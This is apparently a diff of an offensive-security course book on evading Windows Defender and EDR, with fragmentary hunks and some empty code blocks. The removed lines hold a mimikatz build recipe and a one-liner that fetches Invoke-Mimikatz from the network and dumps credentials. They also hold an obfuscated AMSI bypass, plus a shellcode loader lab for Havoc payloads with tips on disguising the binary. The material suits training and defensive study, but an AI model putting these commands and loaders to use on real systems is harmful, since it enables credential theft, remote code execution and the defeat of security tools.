-Product: LocalLoader
-Copyright: Copyright ©  2025
-</code></pre>
-<h2><a class="header" href="#msbuildexe-csharp-c" id="msbuildexe-csharp-c"><em><strong>msbuild.exe (CSharp, C++)</strong></em></a></h2>
-<pre><code class="language-code">msbuild buildapp.csproj -t:HelloWorld
-msbuild mimidogz.sln /t:Build /p:Configuration=Release /p:Platform=x64
-</code></pre>
-<pre><code class="language-code">@echo off
-set msBuildExe=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot;
-set solutionsFile=&quot;C:\TestProject\mySln.sln&quot;
-rem Build the solutions:  
-%msBuildExe% /t:Build /p:Configuration=Release /p:Platform=x64 %solutionsFile%
-</code></pre>
-<hr />
-<h2><a class="header" href="#clexe-c-visual-studio" id="clexe-c-visual-studio"><em><strong>CL.exe (C)</strong></em> Visual Studio</a></h2>
-<pre><code class="language-code">Developer Prompt Visual Studio
-cl.exe hello.c /out:hello.exe /exe
-
-git clone https://github.com/gentilkiwi/mimikatz.git
-
-cl.exe /Zi /I inc\ mimikatz\modules\misc\kuhl_m_misc_citrix.c modules\kull_m_kernel.c 
-modules\kull_m_memory.c modules\kull_m_minidump.c modules\kull_m_output.c 
-modules\kull_m_process.c modules\kull_m_string.c lib\x64\ntdll.min.lib 
-/link kernel32.lib user32.lib advapi32.lib shell32.lib crypt32.lib rpcrt4.lib vcruntime.lib ucrt.lib 
-/entry:kuhl_m_misc_citrix_logonpasswords 
-/subsystem:console
-</code></pre>
-<hr />
-<p>Staged vs Stageless</p>
-<hr />
-<h1><a class="header" href="#a-note-on-compiling" id="a-note-on-compiling">A note on compiling</a></h1>
-<p>without code optimisation, all imported functions are show. With code optimization, only virtuallalloc and exitprocess.</p>
-<p>The command <code>cl /Od /Zi /Fe:local_loader.exe Local_loader_C.c</code> is used to compile a C source file using the Microsoft Visual C++ (MSVC) compiler. Here's a breakdown of each part of the command:</p>
-<ul>
-<li>
-<p><code>cl</code>: This is the command-line compiler for Microsoft Visual C++.</p>
-</li>
-<li>
-<p><code>/Od</code>: This flag disables optimization. It ensures that the compiler does not perform any optimizations that might remove or alter the code, which is useful for debugging and ensuring that all function calls are preserved.</p>
-</li>
-<li>
-<p><code>/Zi</code>: This flag generates complete debugging information. It creates a Program Database (PDB) file that contains debugging information, which is useful for debugging the executable with a debugger.</p>
-</li>
-<li>
-<p><code>/Fe:local_loader.exe</code>: This flag specifies the name of the output executable file. In this case, it sets the output file name to <code>local_loader.exe</code>.</p>
-</li>
-<li>
-<p>Local_loader_C.c: This is the name of the C source file to be compiled.</p>
-</li>
-</ul>
-<p>Putting it all together, the command compiles the Local_loader_C.c source file into an executable named <code>local_loader.exe</code>, with optimizations disabled and debugging information included.</p>
-<p>To run this command, you would typically open a Developer Command Prompt for Visual Studio and execute the command there. Here is an example of how you might run it:</p>
-<pre><code class="language-sh">cl /Od /Zi /Fe:local_loader.exe Local_loader_C.c
-</code></pre>
-<p>After running this command, you can use tools like Dependency Walker to inspect the import table of <code>local_loader.exe</code> and verify that all the expected functions are listed.</p>
-<hr />
-<pre><code class="language-bash">C:\Lab&gt;dumpbin /imports Local_loader_C.exe
-Microsoft (R) COFF/PE Dumper Version 14.42.34436.0
-Copyright (C) Microsoft Corporation.  All rights reserved.
-
-
-Dump of file Local_loader_C.exe
-
-File Type: EXECUTABLE IMAGE
-
-  Section contains the following imports:
-
-    KERNEL32.dll
-             140017000 Import Address Table
-             140020EC0 Import Name Table
-                     0 time date stamp
-                     0 Index of first forwarder reference
-
-                         610 WaitForSingleObject
-                         232 GetCurrentProcess
-                         233 GetCurrentProcessId
-                         103 CreateThread
-                         5FF VirtualAlloc
-                         654 WriteProcessMemory
-                         4F5 RtlCaptureContext
-                         4FD RtlLookupFunctionEntry
-                         504 RtlVirtualUnwind
-                         ...
-</code></pre>
-<p>IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;</p>
-<p>$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');$field.SetValue($null,$true)</p>
 <h1><a class="header" href="#chapter-121---win32api-functions-kernel-and-user-mode" id="chapter-121---win32api-functions-kernel-and-user-mode">Chapter 1.2.1 - WIN32api, Functions, kernel and user mode</a></h1>
 <p>learn.micorosoft.com</p>
 <p>Explain Kernel vs user mode (ntdll.dll, kernel32.dll, kernelbase.dll)</p>
@@ -1137,103 +940,6 @@ class Program
     }
 }
 </code></pre>
-<h1><a class="header" href="#lab-11---payloads" id="lab-11---payloads">Lab 1.1 - Payloads</a></h1>
-<h1><a class="header" href="#lab---shellcode" id="lab---shellcode">Lab - Shellcode</a></h1>
-<blockquote>
-<p>OPSEC HINT : Let's apply some basic best practices when we compile the following code</p>
-<ol>
-<li>add and icon file to the dotnet app.</li>
-<li>add metadata</li>
-<li>Remove comments</li>
-<li>compile with CSC</li>
-</ol>
-</blockquote>
-<p>When compiling the dotnet code you can specify the .net version</p>
-<pre><code class="language-powershell">
-</code></pre>
-<p>We'll need the .Net Developer Pack 4.8, let's see if it is installed:</p>
-<pre><code class="language-cmd">reg query &quot;HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full&quot; /v Version
-</code></pre>
-<p>CSC.exe is located in &quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe&quot;</p>
-<blockquote>
-<p>HINT : Remember that AMSI will behave differently with .net assemblies than it would when using powershell scripts. In a powershell script amsi.?dll is automatically loaded into powershell, with dotnet assemblies AMSI will interact with the CLR on demand.</p>
-</blockquote>
-<p>Let's generate a Havoc shellcode payload (on <code>KALI</code> using the Havoc GUI):</p>
-<p>Screenshots + xxd (hexview) payload.</p>
-<p>Switch to your windows and under <code>&quot;C:\THEV\Labs\LocalLoader&quot;</code> you'll find a csharp solution file - open that with Visual Studio 2022.</p>
-<p>We'll now build our own custom (but very basic) shellcode loader in CSHARP (= dotnet assembly).</p>
-<pre><code class="language-csharp">using System;
-using System.Runtime.InteropServices;
-
-namespace ShellcodePayload
-{
-    class Payload
-    {
-        [DllImport(&quot;kernel32.dll&quot;)]
-        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-
-        [DllImport(&quot;kernel32.dll&quot;)]
-        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
-
-        [DllImport(&quot;kernel32.dll&quot;)]
-        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-        static void Main()
-        {
-            // (1) insert our shellcode
-            byte[] shellCode = new byte[] { /* insert shellcode here */ };
-
-            // (2) allocate memory for shellcode
-            UInt32 MEM_COMMIT = 0x1000;
-            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-            // (3) inject shellcode into allocated memory
-            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);
-
-            // (4) execute injected shellcode
-            UInt32 threadId = 0;
-            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
-        }
-    }
-}
-</code></pre>
-<hr />
-<p>Here's a small shellcode formatter toos in powershell, it converts a binary file to csharp:</p>
-<pre><code class="language-powershell">$fileName = &quot;C:\temp\demon.x64.bin&quot;
-$fileContent = [IO.File]::ReadAllBytes($fileName)
-#$fileContent
-$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
-$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
-Write-Output &quot;[+] Shellcode length: $($csharpformat.Length) bytes&quot;
-$csharpformat | add-content ($fileName + &quot;.cs&quot;)
-Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
-</code></pre>
-<hr />
-<p>Hooka</p>
-<p>Donut</p>
-<h1><a class="header" href="#lab---basic-loader" id="lab---basic-loader">Lab - Basic Loader</a></h1>
-<p>Generate havoc shellcode/helloworld dialog</p>
-<p>Convert the shellcode to a CSharp array:</p>
-<pre><code class="language-powershell">$fileName = &quot;C:\temp\demon.x64.bin&quot;
-$fileContent = [IO.File]::ReadAllBytes($fileName)
-#$fileContent
-$csharpformat = '0x' + (($fileContent | ForEach-Object ToString x2 | ForEach-Object { $_ + ',' }) -join '0x')
-$csharpformat = $csharpformat.SubString(0, $csharpformat.Length-1)
-Write-Output &quot;[+] Shellcode length: $($csharpformat.Length) bytes&quot;
-$csharpformat | add-content ($fileName + &quot;.cs&quot;)
-Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
-</code></pre>
-<p>Load this shellcode into you basic loader template:</p>
-<pre><code class="language-CSHARP">
-</code></pre>
-<p>To build our own shellcode loader we need 4 functions:</p>
-<p>VirtualAlloc (Kernel32.dll)
-CreateRemoteThread (Kernel32.dll)
-MarshallCopy
-WaitForSingleObject (Kernel32.dll)</p>
-<h1><a class="header" href="#lab---staged-loader" id="lab---staged-loader">Lab - Staged Loader</a></h1>
 <h1><a class="header" href="#chapter-01---windows-defender--mde-edr" id="chapter-01---windows-defender--mde-edr">Chapter 0.1 - Windows Defender / MDE (EDR)</a></h1>
 <blockquote>
 <p><em><strong>TL;DR :</strong></em> This chapter explains how most AV/EDR's work - in this case we'll foce on Microsoft Defender (the AV part), MDE (Microsoft Defender for Endpoint) which is the EDR component that we'll deal with later on.</p>
